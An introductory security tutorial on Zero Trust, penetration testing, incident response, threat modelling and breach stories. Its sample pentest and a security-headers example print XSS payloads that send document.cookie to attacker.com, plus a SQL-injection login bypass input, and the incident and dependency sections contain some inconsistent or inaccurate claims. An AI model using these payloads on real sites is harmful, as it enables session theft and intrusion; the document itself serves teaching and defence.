## Introduction


Zero Trust is a radical shift in security thinking: **never trust, always verify**. Instead of trusting the network perimeter ("firewall protects us"), assume every user, device, and request is potentially malicious.

Penetration testing is red teaming: attackers simulate real threats, finding vulnerabilities before real attackers do.

Security culture is the human element: policies, training, processes that make security everyone's responsibility.

## Noob Explanation


### Traditional Security (Perimeter-Based)


Imagine a medieval castle:

```
Outside the castle: DANGEROUS
- Moats, walls, guards
- Only trusted people allowed in

Inside the castle: SAFE
- Everyone is trusted
- Anyone can access the treasury
- No locks on doors

If attacker gets through the wall:
- Complete access to everything
- Can steal, sabotage, destroy
```

**Problem:** One breach = total compromise

### Zero Trust Security (Defense in Depth)


Same castle, better defense:

```
Outside the castle: DANGEROUS (as before)

Inside the castle: STILL DANGEROUS
- Every door has a lock
- Every person has a badge
- Every room is monitored
- You must prove your identity at each door
- Even the king gets checked

If attacker gets through the wall:
- Cannot go far without proper badge
- Monitored at each checkpoint
- If they try to access treasury, alarm sounds
- Attacker can only access one room, not everything
```

**Result:** Smaller blast radius, faster detection

### Airport Security Analogy


**Old way (perimeter):**
- Checkpoint at entrance (TSA)
- Once you pass, you're trusted
- You can wander anywhere, board any plane
- Security only at perimeter

**New way (Zero Trust):**
- Checkpoint at entrance (TSA)
- Checkpoint at gate (boarding pass, ID, ticket match)
- Checkpoint at airplane door (final verification)
- Cameras everywhere
- Random security checks

Multiple verification points, harder to compromise.

### Attack Flow Visualization


**Before Zero Trust:**
```
Attacker compromises 1 employee laptop
    ↓
Attacker gets on network
    ↓
Attacker has full network access (perimeter firewall is inside)
    ↓
Attacker reaches database
    ↓
Attacker exfiltrates all customer data

Time to compromise: Hours
```

**After Zero Trust:**
```
Attacker compromises 1 employee laptop
    ↓
Laptop is isolated from network (network segmentation)
    ↓
Attacker tries to connect to VPN: requires MFA, approved device list
    ↓
Laptop not in approved list (not compliant with security standards)
    ↓
Connection rejected
    ↓
Attacker tries different approach (steal credentials, phishing)
    ↓
Attacker gets employee's credentials
    ↓
Attacker tries to login to database: requires:
   - Valid username/password ✓
   - MFA (attacker doesn't have) ✗
   - From approved IP (attacker's IP blocked) ✗
   - Device fingerprint matches (doesn't) ✗
    ↓
Login rejected, incident logged
    ↓
Security team investigates unusual login attempt
    ↓
Attack prevented

Time to detect: Minutes
Time to contain: Hours
Attack unsuccessful
```

## Zero Trust Architecture


### Core Principles


```
1. NEVER TRUST, ALWAYS VERIFY
   - Even internal traffic is encrypted and authenticated
   - Every request must be verified

2. ASSUME COMPROMISE
   - Assume attacker is already inside network
   - Design for detection and containment, not prevention

3. VERIFY EXPLICITLY
   - Use all available data points
   - Continuous verification, not one-time

4. LEAST PRIVILEGE
   - Users get minimum necessary access
   - Access is temporary and revocable

5. SECURE BY DEFAULT
   - Deny by default, allow only what's necessary
   - No exceptions without documented risk assessment
```

### The Five Pillars of Zero Trust


```
1. IDENTITY
   - Strong authentication (MFA, WebAuthn)
   - Continuous verification
   - Contextual analysis (time, location, device)

2. DEVICE
   - Device inventory (know every device)
   - Compliance checks (is device secure?)
   - Mobile device management (MDM)

3. NETWORK
   - Microsegmentation (small zones, not big network)
   - Encrypted traffic
   - Monitoring and inspection

4. APPLICATION
   - Strong auth per app
   - Least privilege per app
   - Audit logging

5. DATA
   - Encryption at rest (AES-256)
   - Encryption in transit (TLS)
   - Access controls (who can read what)
```

### Microsegmentation Example

### Continuous Verification Flow


```
User → Authenticate (username/password/MFA)
    ↓
    Check: Is user in approved group? ✓
    Check: Does user have valid session? ✓
    Check: Is session from approved device? ✓
    Check: Is device compliant (updated, encrypted)? ✓
    Check: Is IP from approved location/network? ✓
    Check: Is time within business hours? ✓
    ↓
Access granted
    ↓
User makes request to resource
    ↓
    Verify: Is user still authenticated? ✓
    Verify: Is user allowed to access this resource? ✓
    Verify: Is access pattern anomalous? ✓
    ↓
    Log: User alice accessed database table customers at 2024-05-27 10:45:32
    ↓
Access granted
    ↓
User logs out or session expires
    ↓
All access revoked immediately

## Penetration Testing


### Types of Tests


```
1. RECONNAISSANCE
   - Public information gathering
   - No access to systems
   - Legal: Always get written permission

2. VULNERABILITY SCANNING
   - Automated tools find vulnerabilities
   - Port scanning, service enumeration
   - SQL injection testing, XSS testing

3. SOCIAL ENGINEERING
   - Phishing emails
   - Phone calls ("I'm from IT, verify your password")
   - Pretexting

4. PHYSICAL SECURITY
   - Can attacker enter data center?
   - Can they access restricted areas?
   - Tailgating (following employee into building)

5. POST-EXPLOITATION
   - After gaining access, what can attacker do?
   - Can they escalate privileges?
   - Can they exfiltrate data?
   - Can they establish persistence?
```

### Penetration Test Phases


```
PHASE 1: RECONNAISSANCE
├─ Gather public information
├─ DNS queries (subdomains, MX records)
├─ WHOIS lookups
├─ Google search ("site:company.com filetype:pdf")
└─ Social media research

PHASE 2: SCANNING & ENUMERATION
├─ Port scanning (what ports are open?)
├─ Service identification (what versions?)
├─ Web app mapping (what endpoints?)
├─ Database enumeration (what tables?)
└─ Directory discovery

PHASE 3: VULNERABILITY IDENTIFICATION
├─ Known CVEs (does version have known vulnerability?)
├─ Configuration weaknesses (default passwords, open shares)
├─ Code analysis (SQL injection, XSS, CSRF)
├─ Business logic flaws
└─ Access control issues

PHASE 4: EXPLOITATION
├─ Gain initial access (shell on compromised server)
├─ Privilege escalation (user → admin)
├─ Lateral movement (one server → another)
├─ Data exfiltration (steal data)
└─ Persistence (backdoor for future access)

PHASE 5: REPORTING
├─ Document findings
├─ Severity ratings (Critical, High, Medium, Low)
├─ Impact analysis
├─ Remediation recommendations
└─ Proof of concept code
```

### Real Penetration Test Example


**Target:** Startup's e-commerce platform

**Phase 1: Reconnaissance**
```bash
# DNS enumeration
dig company.com
# Returns: api.company.com, admin.company.com, mail.company.com

# Subdomain discovery
amass enum -d company.com
# Finds: dev.company.com (not advertised publicly)

# WHOIS lookup
whois company.com
# Gets: admin email, registrar, creation date

# Google search
site:company.com filetype:pdf
# Finds: PDF from investor meeting with architecture diagram
```

**Phase 2: Scanning**
```bash
# Port scan
nmap -p- company.com
# Results:
# 22/tcp open ssh OpenSSH 7.2
# 80/tcp open http Apache httpd 2.4.18
# 443/tcp open https Apache httpd 2.4.18
# 5432/tcp open postgresql (exposed!)

# Service version check
nmap -sV -p 22,80,443,5432 company.com
# Identifies vulnerable versions:
# OpenSSH 7.2 (has CVE-2016-6210)
# Apache 2.4.18 (has CVE-2016-5387)
```

**Phase 3: Vulnerability Identification**
```
Finding 1: PostgreSQL exposed (port 5432)
- Accessible without authentication required
- Attacker can dump entire database

Finding 2: XSS in product search
- Search parameter: /products?q=<script>alert('xss')</script>
- Script executes in user's browser
- Can steal session cookies

Finding 3: CSRF in admin panel
- No CSRF token on account deletion
- Attacker can trick admin into deleting account

Finding 4: SQL Injection in login form
- Username field: admin' --
- Attacker can bypass password check
```

**Phase 4: Exploitation**
```
Step 1: Exploit XSS to steal admin session cookie
- Create malicious link: company.com/products?q=<img src=x onerror="fetch('attacker.com/steal?c='+document.cookie)">
- Send in email to admin
- Admin clicks link
- Browser sends session cookie to attacker

Step 2: Use stolen admin session
- POST /admin/api/delete_user HTTP/1.1
- Cookie: admin_session=stolen_value
- Admin API allows user deletion with just session

Step 3: Access PostgreSQL
- Connect to 5432 (no password required)
- Query: SELECT * FROM users;
- Get 100,000 customer records
- Query: SELECT * FROM credit_cards;
- Get payment information (unencrypted!)

Step 4: Establish persistence
- Create new admin account via SQL injection
- username: backdoor, password: complex_hash
- Now attacker has permanent access
```

**Phase 5: Report**

### Sample Incident Timeline


**2024-05-27 02:15 AM**
- SIEM alerts: "10,000+ failed login attempts from single IP"
- On-call engineer wakes up, sees alert
- Severity: HIGH (possible brute force attack)

**2024-05-27 02:20 AM**
- Engineer investigates
- IP: 203.0.113.42 (from country X)
- Target: Customer database user accounts
- Attacker tried weak passwords (password, password123, admin123, etc.)

**2024-05-27 02:25 AM**
- All logins failed (good: rate limiting worked)
- But attacker got 1 valid password from another source
- Attacker logged in: username "john.doe" (employee account)
- This was not caught because it was a valid password + successful login

**2024-05-27 02:30 AM**
- Incident escalated to security team
- John Doe confirmed he did not login from IP 203.0.113.42
- Probable: Password was phished earlier or stolen from another company

**2024-05-27 02:35 AM**
- Actions taken:
  * Block IP 203.0.113.42 at firewall
  * Revoke john.doe's session tokens
  * Disable john.doe's password (force reset)
  * Require john.doe to use MFA
  * Review john.doe's account for suspicious activity

**2024-05-27 02:45 AM**
- Investigation: Did attacker see any data?
- Check logs: john.doe account accessed customer database
- Query: SELECT * FROM customers LIMIT 100
- Attacker dumped ~100 customer records (names, emails, hashed passwords)

**2024-05-27 03:00 AM**
- Scope assessment:
  * 100 customers affected
  * No credit card data exposed (stored separately, encrypted)
  * No personally identifiable information exposed (hashed passwords)
  * Attack duration: ~10 minutes

**2024-05-27 03:30 AM**
- Legal notified
- Data breach threshold: 100 people (must notify under GDPR)
- Customer notification plan drafted

**2024-05-27 04:00 AM**
- Recovery:
  * All employees forced to reset passwords
  * All sessions invalidated
  * Require MFA for all accounts
  * Enhance monitoring

**2024-05-27 12:00 PM**
- Root cause identified:
  * Employee password reused from LinkedIn breach
  * Employee didn't change password despite breach notification
  * No MFA was required (old policy)

**2024-05-27 02:00 PM**
- Customer notification:
  * Email to 100 affected users
  * Free credit monitoring
  * Explanation of what happened, what wasn't compromised
  * Steps company took to prevent future incidents

**2024-05-28 - 2024-06-03**
- Post-incident improvements:
  * Mandatory MFA for all users
  * Passwordless authentication (WebAuthn) rolled out
  * Employee security training
  * Regular password compromise checking (Have I Been Pwned API)
  * Enhanced monitoring for data exfiltration
```

## Building Security Culture


### The Security Maturity Model


```
LEVEL 1: REACTIVE
├─ Security is an afterthought
├─ Incident response: chaotic
├─ No training
├─ No processes
└─ Example: Company finds out about breach from news article

LEVEL 2: RESPONSIVE
├─ Incident response team exists
├─ Basic security training
├─ Some processes documented
├─ Vulnerabilities fixed after discovery
└─ Example: Company detects breach via monitoring, handles it

LEVEL 3: PROACTIVE
├─ Regular security testing
├─ All employees receive training
├─ Policies documented and followed
├─ Vulnerabilities found and fixed before exploitation
├─ Threat modeling done before new projects
└─ Example: Penetration test finds vulnerability, company fixes it

LEVEL 4: PREVENTIVE
├─ Security by design (built into every project)
├─ All employees understand security responsibility
├─ Continuous monitoring and improvement
├─ Zero tolerance for security debt
├─ Example: Security review is mandatory before deployment

LEVEL 5: WORLD-CLASS
├─ Security culture is embedded
├─ Employees proactively find vulnerabilities
├─ Continuous improvement
├─ Threat hunting (actively searching for attackers)
├─ Red team exercises regularly
└─ Example: Employee reports social engineering attempt, company uses it for training

## Threat Modeling


### STRIDE Methodology


```
SPOOFING (Identity Spoofing)
├─ Attacker impersonates legitimate user
├─ Example: Forged email from CEO asking for funds transfer
├─ Mitigation: Strong authentication, digital signatures

TAMPERING (Data Tampering)
├─ Attacker modifies data in transit or at rest
├─ Example: Attacker modifies network packet to change transfer amount
├─ Mitigation: Encryption, checksums, code signing

REPUDIATION (Denying Actions)
├─ Attacker denies they performed an action
├─ Example: "I didn't delete that file" (no audit log)
├─ Mitigation: Comprehensive logging, digital signatures

INFORMATION DISCLOSURE (Privacy)
├─ Attacker reads sensitive data they shouldn't
├─ Example: Database exposed on public internet
├─ Mitigation: Encryption, access controls, data classification

DENIAL OF SERVICE (Availability)
├─ Attacker makes service unavailable
├─ Example: DDoS attack flooding server with requests
├─ Mitigation: Rate limiting, redundancy, DDoS protection

ELEVATION OF PRIVILEGE (Authorization)
├─ Attacker gains higher level of access than intended
├─ Example: Regular user becomes admin
├─ Mitigation: Least privilege, input validation, security reviews
```

## Failure Analysis


### Inadequate Monitoring → Months of Undetected Breach


**Scenario:**
```
June 1: Attacker gains access via SQL injection
        Begins exfiltrating customer database
        Hundreds of MB of data leaving company server

June 15: Attacker sets up backdoor for persistent access

July 1: Attacker begins selling data on dark web
        "100,000 customers from tech company"

November 5: Company discovers breach
            From security researcher who found data for sale
            4 MONTHS of undetected compromise

Impact:
- 100,000 customers affected
- Regulatory fines
- Class action lawsuit
- Reputational damage
```

**Defense: Continuous monitoring**

```python
# Monitor for data exfiltration
class DataExfiltrationMonitor:
    def __init__(self):
        self.baseline_outbound_traffic = 50_GB_per_day
        self.alert_threshold = 100_GB_per_day  # 2x normal
    
    def check_traffic(self):
        current_traffic = get_egress_traffic()
        
        if current_traffic > self.alert_threshold:
            alert("Unusual outbound traffic: {}GB".format(current_traffic))
            # Investigate:
            # - Which process is sending data?
            # - To where (IP address)?
            # - Database queries showing unusual patterns?
        
        # Also check for suspicious database queries
        suspicious_queries = [
            "SELECT * FROM users",  # Bulk data dump
            "SELECT * FROM customers",
            "SELECT COUNT(*) FROM credit_cards",  # Reconnaissance
        ]
        
        if any(query in recent_database_queries for query in suspicious_queries):
            alert("Suspicious database query detected")
```

### Disabled Security Headers → XSS Compromise


**Scenario:**
```javascript
// Developer disables security headers for testing
// Forgets to re-enable before production

Response headers:
// Missing: Content-Security-Policy
// Missing: X-Frame-Options
// Missing: X-Content-Type-Options

User visits product page with XSS vulnerability
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

Without CSP:
- Script runs
- Session cookie sent to attacker
- Attacker uses cookie to impersonate user
- Account compromised
```

**Defense: Enforce headers**

```python
@app.after_request
def set_security_headers(response):
    # Content Security Policy
    response.headers['Content-Security-Policy'] = \
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
    
    # Prevent clickjacking
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    
    # Prevent MIME type sniffing
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    # Prevent XSS in older browsers
    response.headers['X-XSS-Protection'] = '1; mode=block'
    
    # Enforce HTTPS
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    
    # Prevent information disclosure
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    return response
```

## Incident Stories


### Story 1: Logging Disabled During Testing → Undetected Breach for 90 Days


**The Setup:**
```
Company implements new logging system
Testing fails because logs are too verbose
Developer disables logging for testing: logging_enabled = false
Developer forgets to re-enable before deployment
Production now has logging disabled
```

**The Breach:**
```
Attacker gains access via phishing (steals employee credentials)
Attacker logs in as employee
Attacker explores company systems
Attacker finds admin account, tries SQL injection
SQL injection succeeds, attacker gets admin access
Attacker accesses customer database
Attacker exfiltrates 500,000 customer records

But: No logs of any of this (logging was disabled)
Company has NO record of attacker activity
```

**Discovery:**
```
90 days later
Customer receives email from attacker: "I have your data"
Attacker demands ransom
Customer contacts company: "Your data is being sold"
Company checks: Customers are legit
Company realizes: They've been breached for 90 days
```

**Impact:**
```
- 500,000 customers affected
- Ransom demand: $1,000,000 (attacker never expected to be paid)
- Regulatory fines: $10,000,000 (GDPR violation)
- Class action lawsuit: $100,000,000 (settlement)
- Reputation destroyed
- Revenue loss
```

**Lesson: Enable logging, never disable in production**

### Story 2: Unpatched Dependency → Full Server Compromise


**The Setup:**
```
Company uses Python library "requests" 2.18.4
Library has critical vulnerability: CVE-2018-18074
Attacker can perform MITM attack
Company didn't update library
```

**The Attack:**
```
Attacker performs MITM on company's internet connection
Attacker intercepts HTTPS traffic
Company makes API call using vulnerable "requests" library
Library doesn't verify server certificate properly
Attacker serves fake certificate
App accepts fake certificate (vulnerability in library)
Attacker now intercepts API communication
Company sends API key to attacker (thinking it's real API)
Attacker uses API key to:
  - Access company's cloud provider
  - Spin up instances
  - Mine cryptocurrency for 30 days
  - Rack up $100,000 in cloud bills
```

**Discovery:**
```
Cloud provider sends bill: $100,000
Company sees unknown instances running
Company investigates
Company realizes API keys were compromised
Company realizes from unpatched library
```

**Lesson: Keep dependencies updated, use dependency scanning**
